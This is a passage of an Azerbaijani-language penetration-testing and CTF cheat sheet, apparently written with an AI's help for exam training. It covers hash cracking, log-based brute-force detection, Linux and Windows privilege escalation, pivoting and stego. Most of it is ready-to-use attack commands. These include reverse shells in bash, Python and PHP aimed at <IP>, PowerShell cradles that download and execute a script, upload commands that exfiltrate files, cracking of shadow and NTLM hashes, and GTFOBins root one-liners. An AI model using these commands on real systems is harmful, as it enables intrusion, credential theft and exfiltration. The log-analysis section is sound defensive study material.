hashcat -m <mode> -a 0 hash.txt /usr/share/wordlists/rockyou.txt
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt --show
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# tez-tez lazım olan mode-lar:
#   0     = MD5            100   = SHA1         1400 = SHA256
#   1000  = NTLM           1800  = sha512crypt  500  = md5crypt
#   5600  = NetNTLMv2      13100 = Kerberoast   18200 = AS-REP
#   16500 = JWT (HS256)    3200  = bcrypt       1700 = SHA512

# Hash tipini tanı:
hashid '<hash>'
hash-identifier
```

### LINUX SHADOW & WINDOWS SAM CRACK
```bash
# --- Linux: /etc/shadow ---
# passwd + shadow birləşdir (root oxuya bilirsənsə):
unshadow /etc/passwd /etc/shadow > unshadowed.txt
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt   # $6$ = sha512crypt
#   $1$=md5crypt(500)  $5$=sha256(7400)  $6$=sha512(1800)  $y$=yescrypt

# --- Windows: SAM / NTLM ---
# secretsdump-dan çıxan format:  user:RID:LM:NT:::
hashcat -m 1000 nt.hash /usr/share/wordlists/rockyou.txt          # NTLM
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt nt.hash
# offline SAM+SYSTEM hive-dan:
impacket-secretsdump -sam sam.hive -system system.hive LOCAL
```

---

## III. LOG ANALYSIS (Incident Forensics)

### 3.1 Əsas Bash Alətləri
```bash
cat access.log | head / tail / less
wc -l access.log                          # sətir sayı
sort | uniq -c | sort -nr                 # tezliyə görə say
grep "pattern" access.log
grep -i "error" access.log                # case-insensitive
grep -E "404|500" access.log              # regex
awk '{print $1}' access.log               # sütun seç (IP)
cut -d' ' -f1 access.log
```

### 3.2 Tipik Web Log Sorğuları (Apache/Nginx)
```bash
# Ən aktiv IP-lər
awk '{print $1}' access.log | sort | uniq -c | sort -nr | head

# Ən çox sorğulanan URL-lər
awk '{print $7}' access.log | sort | uniq -c | sort -nr | head

# Status kodlara görə (4xx, 5xx)
awk '{print $9}' access.log | sort | uniq -c | sort -nr

# Müəyyən IP-nin bütün aktivliyi
grep "192.168.1.50" access.log

# Müəyyən vaxt aralığı
awk '$4 >= "[24/Jun/2025:14:00:00"' access.log
```

### 3.3 Hücum İzlərinin Tapılması (Threat Hunting)
```bash
# SQLi / XSS / LFI cəhdləri
grep -iE "union|select|';|--|<script>|\.\./|/etc/passwd" access.log

# Brute-force (eyni IP-dən çoxlu 401/403)
grep " 401 " access.log | awk '{print $1}' | sort | uniq -c | sort -nr

# Anormal User-Agent (sqlmap, nikto, curl, nmap)
grep -iE "sqlmap|nikto|nmap|curl|python" access.log

# Suspicious POST sorğuları
grep "POST" access.log | grep -iE "shell|cmd|upload"
```

### 3.4 System / Auth Loqları
```bash
# Uğursuz login cəhdləri
grep "Failed password" /var/log/auth.log
grep "Failed password" /var/log/auth.log | awk '{print $11}' | sort | uniq -c | sort -nr

# Uğurlu loginlər
grep "Accepted password" /var/log/auth.log

# sudo / privilege istifadəsi
grep "sudo" /var/log/auth.log

# journalctl (systemd)
journalctl -u ssh --since "1 hour ago"
journalctl -p err -b
last / lastb                              # login tarixçəsi
```

### 3.4.1 🔴 UĞURSUZ GİRİŞLƏR (Failed logins) — detallı
```bash
# --- SSH (Linux /var/log/auth.log və ya /var/log/secure) ---
grep "Failed password" /var/log/auth.log                  # bütün uğursuzlar
grep -c "Failed password" /var/log/auth.log               # NEÇƏ dəfə (say)
grep "authentication failure" /var/log/auth.log
grep "Invalid user" /var/log/auth.log                     # mövcud olmayan user cəhdləri

# Hansı IP-dən neçə uğursuz cəhd (mənbə IP-ni çıxar):
grep "Failed password" /var/log/auth.log | grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | sort | uniq -c | sort -nr

# Hansı USER-ə hücum olunub:
grep "Failed password" /var/log/auth.log | awk '{print $(NF-5)}' | sort | uniq -c | sort -nr

# Uğursuz vs uğurlu (eyni IP həm fail, həm accepted → brute uğurlu olub!):
grep "Accepted password" /var/log/auth.log | grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" | sort -u
```

### 3.4.2 🔴 BRUTE-FORCE AŞKARLAMA (attack detection)
```bash
# === SSH brute-force ===
# Bir IP-dən çoxlu uğursuz giriş = brute-force əlaməti:
grep "Failed password" /var/log/auth.log \
  | grep -oE "[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+" \
  | sort | uniq -c | sort -nr | head
#   məs:  847 192.168.1.50   ← bu IP brute-force edir

# Hücumçu IP-nin BÜTÜN aktivliyi (timeline):
grep "192.168.1.50" /var/log/auth.log

# Brute-force UĞURLU olubmu? (eyni IP-də fail çoxdur, sonra Accepted var):
grep "192.168.1.50" /var/log/auth.log | grep "Accepted"
#   nəticə varsa → hücumçu daxil olub, hansı user/vaxt:
grep "192.168.1.50" /var/log/auth.log | grep "Accepted password"

# === Web login brute-force (access.log) ===
# Eyni IP-dən çoxlu POST /login (qısa müddətdə):
grep "POST /login" access.log | awk '{print $1}' | sort | uniq -c | sort -nr | head

# 401/403 (auth fail) status kodlarını IP üzrə say:
awk '$9==401 || $9==403 {print $1}' access.log | sort | uniq -c | sort -nr

# Eyni IP-dən qısa zamanda çox sorğu (rate-based detection):
awk '{print $1}' access.log | sort | uniq -c | sort -nr | head -20

# Uğurlu login (302 redirect / 200) brute-dan sonra:
grep "POST /login" access.log | awk '$9==302 {print $1, $4}'
```

### 3.4.3 🔴 HTTP UĞURSUZ/XƏTA SORĞULARI
```bash
# Bütün 4xx (client error) və 5xx (server error):
awk '$9 ~ /^4|^5/ {print $9}' access.log | sort | uniq -c | sort -nr

# 404-lər (dir/file brute-force, gobuster izi):
awk '$9==404 {print $7}' access.log | sort | uniq -c | sort -nr | head
grep " 404 " access.log | awk '{print $1}' | sort | uniq -c | sort -nr   # kim 404 yaradır

# 500-lər (exploit cəhdi serverdə xəta yaradıb — SQLi/LFI əlaməti):
awk '$9==500 {print $1, $7}' access.log

# Müvəffəqiyyətli exploit (404/403-dən sonra eyni URL-də 200):
awk '$9==200 {print $7}' access.log | sort | uniq -c | sort -nr | head
```

### 3.5 Faydalı One-liner-lər
```bash
# Unikal IP sayı
awk '{print $1}' access.log | sort -u | wc -l

# Saat üzrə trafik paylanması (spike = hücum vaxtı)
awk '{print $4}' access.log | cut -d: -f2 | sort | uniq -c

# Exfiltrasiya (böyük cavab ölçüləri)
awk '{print $10, $7}' access.log | sort -nr | head

# İki loq faylını birləşdirib analiz
cat *.log | grep "attacker_ip"

# Top 10 hücumçu IP (404+401+403+500 cəmi):
awk '$9 ~ /40[0-9]|500/ {print $1}' access.log | sort | uniq -c | sort -nr | head

# Müəyyən vaxt aralığındakı hadisələr:
awk '$4 >= "[25/Jun/2026:14:00" && $4 <= "[25/Jun/2026:15:00"' access.log

# fail2ban-ın blokladığı IP-lər (varsa):
grep "Ban " /var/log/fail2ban.log | awk '{print $NF}' | sort | uniq -c
```

> 💡 **Brute-force-u tanımaq qaydası:** eyni mənbə IP + qısa zaman + çoxlu uğursuz cəhd (`Failed password` / 401 / 403). Sonra həmin IP-də `Accepted` / 200 / 302 axtarırsan — varsa, **hücum uğurlu olub**, hansı user və hansı vaxtda daxil olduğunu tapırsan.

---

## 🐧 LINUX — ƏSAS KOMANDALAR (CTF)

```bash
### Naviqasiya & fayl
pwd ; ls -la ; cd <dir> ; cat file ; less file
find / -name "flag*" 2>/dev/null          # flag axtar
find / -name "*.txt" 2>/dev/null | grep -i flag
grep -rni "flag{" / 2>/dev/null           # bütün sistemdə flag pattern
locate flag.txt

### Fayl əməliyyatları (copy / move / path)
pwd                                        # hazırkı yol (current path)
cd /etc ; cd ~ ; cd ..                     # qovluğa keç / ev / yuxarı
cp file.txt /tmp/                          # kopyala
cp -r dir/ /tmp/                           # qovluğu rekursiv kopyala
mv file.txt /tmp/yeni.txt                  # daşı / adını dəyiş
rename / mv eski.txt yeni.txt              # adını dəyiş
mkdir -p /tmp/test/alt                     # qovluq yarat (alt-qovluqlarla)
rm file.txt ; rm -rf dir/                  # sil
touch yeni.txt                             # boş fayl yarat
ln -s /etc/passwd link.txt                 # symbolic link
realpath file.txt ; readlink -f file.txt   # tam (absolute) yolu göstər
basename /a/b/c.txt ; dirname /a/b/c.txt   # fayl adı / qovluq adı

### User & sistem məlumatı
whoami ; id ; hostname ; uname -a
cat /etc/passwd                            # userlər
cat /etc/os-release                        # OS versiyası
sudo -l                                    # sudo hüquqları (priv-esc!)
groups ; w ; last

### Priv-esc enum (manual)
find / -perm -4000 2>/dev/null             # SUID binary-lər (GTFOBins ilə yoxla)
find / -perm -2000 2>/dev/null             # SGID
find / -writable -type d 2>/dev/null       # yazıla bilən qovluqlar
cat /etc/crontab ; ls -la /etc/cron*       # cron job-lar
getcap -r / 2>/dev/null                    # capabilities
ps aux ; netstat -tulpn ; ss -tulpn        # proseslər / portlar

### Həssas fayllar
cat ~/.bash_history
ls -la ~/.ssh/ ; cat ~/.ssh/id_rsa
find / -name "*.conf" 2>/dev/null
find / -name "config*.php" 2>/dev/null     # DB credentials
cat /var/www/html/config.php

### Avtomatik enum
./linpeas.sh
./linenum.sh
```

### 🚀 LINUX PRIV-ESC — KONKRET YOLLAR (GTFOBins)
```bash
# --- 1) sudo -l çıxışına bax → GTFOBins-də binarı axtar ---
sudo -l
# Nümunələr (root almaq):
sudo vim -c ':!/bin/sh'              # vim
sudo find . -exec /bin/sh \; -quit   # find
sudo less /etc/profile  → !/bin/sh   # less
sudo awk 'BEGIN {system("/bin/sh")}' # awk
sudo nmap --interactive → !sh        # köhnə nmap
sudo python3 -c 'import os;os.system("/bin/sh")'
echo 'os.execute("/bin/sh")' > x ; sudo <binary>  # ümumi məntiq

# --- 2) SUID binary (find / -perm -4000) → GTFOBins (SUID bölməsi) ---
./binary    # GTFOBins-də "SUID" üsuluna bax
# Nümunələr:
find . -exec /bin/sh -p \; -quit     # SUID find
bash -p                              # SUID bash (-p = privilegeləri saxla)
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash  # yazıla bilən SUID

# --- 3) Sudo PATH / LD_PRELOAD ---
sudo LD_PRELOAD=/tmp/evil.so <binary>   # env_keep+=LD_PRELOAD olanda

# --- 4) Cron job (yazıla bilən script root-da işləyirsə) ---
cat /etc/crontab
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' >> /path/script.sh
# gözlə → /tmp/rb -p

# --- 5) Kernel exploit (son çarə) ---
uname -a ; cat /etc/issue
searchsploit linux kernel <version>
# məs. DirtyCow, PwnKit (CVE-2021-4034 pkexec)

# --- 6) Capabilities ---
getcap -r / 2>/dev/null
# cap_setuid varsa:  ./python -c 'import os;os.setuid(0);os.system("/bin/sh")'
```

---

## 🪟 WINDOWS — ƏSAS KOMANDALAR (CTF)

```cmd
:: --- CMD ---
whoami ; whoami /priv ; whoami /groups
hostname ; systeminfo
net user                                   :: lokal userlər
net user <username>                        :: user detalı
net localgroup administrators              :: admin qrupu
ipconfig /all ; netstat -ano ; arp -a

:: Fayl & flag axtar
dir /s /b C:\*flag*                        :: flag axtar
dir /s /b C:\Users\*.txt
type C:\Users\Administrator\Desktop\flag.txt
where /r C:\ flag.txt
findstr /si "flag{" C:\*.txt               :: pattern axtar
findstr /si "password" C:\*.txt *.ini *.config

:: Fayl əməliyyatları (copy / move / path)
cd                                         :: hazırkı yol (current path - CMD)
cd C:\Users ; cd .. ; cd \                 :: qovluğa keç / yuxarı / kök
copy file.txt C:\Temp\                     :: kopyala
copy file.txt C:\Temp\yeni.txt             :: kopyala + adla
xcopy /E /I dir C:\Temp\dir                :: qovluğu rekursiv kopyala
robocopy C:\src C:\dst /E                  :: güclü kopyalama (qovluq)
move file.txt C:\Temp\                     :: daşı
ren eski.txt yeni.txt                      :: adını dəyiş
mkdir C:\Temp\test                         :: qovluq yarat
del file.txt ; rmdir /S /Q dir             :: sil

:: Həssas yerlər
type C:\Users\<user>\Desktop\user.txt
dir C:\Users\Administrator\Desktop\

:: --- CMD-DƏN POWERSHELL KOMANDASI İŞLƏTMƏK ---
powershell -c "Get-Process"                        :: sadə komanda
powershell -Command "whoami; hostname"             :: bir neçə komanda
powershell -ep bypass -c "<komanda>"               :: ExecutionPolicy bypass
powershell -nop -w hidden -c "<komanda>"           :: gizli + profilsiz
powershell -ep bypass -File script.ps1             :: .ps1 faylı işlət
:: Base64 encode olunmuş komanda (filtr/bypass üçün):
powershell -enc <BASE64_UTF16LE_KOMANDA>
:: Download cradle (faylı yüklə + işə sal):
powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://<IP>/s.ps1')"
:: cmd dəyişənini PS-ə ötür / çıxışı geri al:
for /f %i in ('powershell -c "(Get-Date).Year"') do @echo %i

:: --- CMD-DƏN POWERSHELL İLƏ FAYL YÜKLƏMƏK (download) ---
:: >>> ƏSAS ÜSUL: Invoke-WebRequest (cmd içində) <<<
powershell -c "Invoke-WebRequest -Uri http://<IP>:8000/gp.exe -OutFile C:\Temp\gp.exe"
powershell -ep bypass -c "Invoke-WebRequest -Uri http://<IP>:8000/gp.exe -OutFile C:\Temp\gp.exe"
powershell -c "iwr http://<IP>:8000/gp.exe -o C:\Temp\gp.exe"     :: qısa alias
:: köhnə PS / IWR olmayanda alternativ:
powershell -c "(New-Object Net.WebClient).DownloadFile('http://<IP>:8000/gp.exe','C:\Temp\gp.exe')"
powershell -c "curl http://<IP>:8000/gp.exe -o C:\Temp\gp.exe"   :: PS-də curl = iwr alias
:: SSL xətası olanda (sertifikat):
powershell -c "[Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; iwr https://<IP>/f -o C:\Temp\f"

:: --- FAYL GÖNDƏRMƏK (upload — exfil) ---
:: Hücumçuda qəbuledici qaldır (məs.):  python3 -m uploadserver 8000
powershell -c "(New-Object Net.WebClient).UploadFile('http://<IP>:8000/upload','C:\loot\flag.txt')"
:: və ya base64 edib ekrana çıxar, sonra kopyala:
powershell -c "[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\loot\flag.txt'))"
:: geri decode (hücumçuda):  echo <b64> | base64 -d > flag.txt

:: certutil ilə də yükləmək olar (PS olmadan):
certutil -urlcache -split -f http://<IP>:8000/gp.exe C:\Temp\gp.exe
```

```powershell
# --- PowerShell ---
Get-ChildItem -Path C:\ -Recurse -Filter "flag*" -ErrorAction SilentlyContinue
Get-Content C:\path\flag.txt
gci -Recurse -Include *.txt | Select-String "flag{"
whoami /priv                               # SeImpersonate? → GodPotato

# Sistem & user
Get-LocalUser ; Get-LocalGroupMember Administrators
Get-Process ; Get-Service
Get-NetTCPConnection

# Stored credentials / həssas
cmdkey /list                               # saxlanmış kredensiallar
Get-ChildItem -Recurse -Include *.config,*.xml,*.ini | Select-String "password"
type C:\Windows\System32\drivers\etc\hosts

# Fayl əməliyyatları (copy / move / path)
Get-Location                               # hazırkı yol (pwd ekvivalenti)
Set-Location C:\Users                      # cd ekvivalenti
Copy-Item file.txt -Destination C:\Temp\   # kopyala
Copy-Item dir\ -Destination C:\Temp\ -Recurse   # qovluğu kopyala
Move-Item file.txt -Destination C:\Temp\   # daşı
Rename-Item eski.txt -NewName yeni.txt     # adını dəyiş
New-Item -ItemType Directory -Path C:\Temp\test   # qovluq yarat
Remove-Item file.txt ; Remove-Item dir\ -Recurse  # sil
Resolve-Path file.txt                      # tam (absolute) yolu göstər
```

```cmd
:: --- Windows priv-esc enum ---
winPEAS.exe
.\PrivescCheck.ps1
:: Unquoted service path / weak permissions yoxla
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows"
:: AlwaysInstallElevated yoxla
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

---

## 🔀 PIVOTING & TUNNELING (daxili şəbəkəyə keçid — AD üçün)

```bash
# Niyə: foothold maşınından DC / daxili host-lara çatmaq

### Chisel (ən çox işlənən — SOCKS proxy)
# Hücumçu (server):
./chisel server -p 8000 --reverse
# Victim (client):
./chisel client <ATTACKER_IP>:8000 R:socks
# sonra proxychains ilə daxili host-a:
proxychains nmap -sT 10.10.20.5
proxychains crackmapexec smb 10.10.20.0/24

# proxychains config:  /etc/proxychains4.conf  →  socks5 127.0.0.1 1080

### SSH tunneling
ssh -L 8080:10.10.20.5:80 user@<pivot>       # local port forward
ssh -D 1080 user@<pivot>                      # dynamic (SOCKS proxy)
ssh -R 4444:127.0.0.1:4444 user@<attacker>    # remote forward

### Ligolo-ng (müasir alternativ)
# Hücumçu:  ./proxy -selfcert
# Victim:   ./agent -connect <ATTACKER_IP>:11601

### Port forward (sadə)
socat TCP-LISTEN:8080,fork TCP:10.10.20.5:80
```

---

## 🔓 ENCODING / STEGO / CTF KLASSİKLƏRİ

```bash
### Encode / Decode
echo "text" | base64                          # encode
echo "dGV4dA==" | base64 -d                    # decode
echo "74657874" | xxd -r -p                    # hex → text
echo "text" | xxd                              # text → hex
echo "uryyb" | tr 'A-Za-z' 'N-ZA-Mn-za-m'      # ROT13
# CyberChef (GUI): https://gchq.github.io/CyberChef/  — "Magic" rejimi

### Fayl analizi (flag faylda gizlənibsə)
file mystery.bin                               # fayl tipini tanı
strings file | grep -i flag                    # oxunan mətnlər
strings -n 8 file                              # min 8 simvol
binwalk file                                   # daxili faylları tap
binwalk -e file                                # çıxart (extract)
xxd file | head                                # hex dump

### Şəkil / metadata stego
exiftool image.jpg                             # metadata (flag burada ola bilər)
steghide extract -sf image.jpg                 # gizli data çıxart (parol sorur)
steghide info image.jpg
zsteg image.png                                # PNG/BMP LSB stego
stegseek image.jpg /usr/share/wordlists/rockyou.txt  # steghide parol brute

### Arxiv / parol
unzip file.zip ; tar -xvf file.tar ; 7z x file.7z
zip2john secret.zip > hash ; john hash         # zip parol crack
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt secret.zip

### QR / digər
zbarimg qr.png                                 # QR oxu
```

---

## ✅ METODOLOGIYA — addım-addım imtahan planı

```
1. RECON
   nmap -p- → açıq portlar → -sC -sV → servis/versiya
   açıq portları "🔌 PORTLAR" cədvəli ilə uyğunlaşdır

2. ENUMERATION (hər port üçün)
   web → gobuster/nikto | SMB → crackmapexec | LDAP → ldapsearch
   default creds + anonymous yoxla

3. INITIAL ACCESS (foothold)
   web vuln (SQLi/LFI/upload) | zəif creds | exposed service
   → reverse shell al → stabilizasiya et

4. ENUM (qurban maşınında)
   Linux: id, sudo -l, SUID, cron, .ssh
   Windows: whoami /priv, net user, winPEAS

5. PRIVILEGE ESCALATION
   GTFOBins (sudo/SUID) | SeImpersonate→GodPotato | kernel exploit

6. LATERAL / AD (lazımdırsa)
   creds/hash topla → BloodHound → Kerberoast → PtH → DCSync
   pivot (chisel) ilə daxili host-lara

7. LOOT
   flag.txt / user.txt / root.txt tap
   find/grep ilə "flag{" axtar

8. QEYD SAXLA
   hər addımı, komandanı, creds-i yaz (raporu unutma!)
```

---

## ⚡ TEZ-TEZ LAZIM OLAN REVERSE SHELL-LƏR
```bash
# Dinləyici (öz maşınında)
nc -lvnp 4444

# Bash
bash -i >& /dev/tcp/<IP>/4444 0>&1

# Python
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("<IP>",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("/bin/bash")'

# PHP
php -r '$s=fsockopen("<IP>",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Shell stabilizasiya
python3 -c 'import pty;pty.spawn("/bin/bash")'
# CTRL+Z → stty raw -echo; fg → export TERM=xterm
```

---

## 🔑 SÜRƏTLİ XATIRLATMALAR

| Mövzu | İlk addım | Əsas alət |
|-------|-----------|-----------|
| AD | SMB/LDAP enum | crackmapexec, bloodhound, impacket |
| IDOR | ID-ləri dəyiş | Burp, ffuf |
| SSRF | localhost/metadata yoxla | Burp Collaborator, nc |
| SQLi | `'` ilə xəta yarat | sqlmap |
| Cmd Inj | `;` `|` `$()` test et | nc reverse shell |
| LFI/RFI | `../etc/passwd` | php filter wrapper |
| Log | `grep`+`awk`+`sort\|uniq` | bash one-liners |

---
> Hazırladı: Cheatsheet üçün Claude · Yalnız təlim məqsədli istifadə.
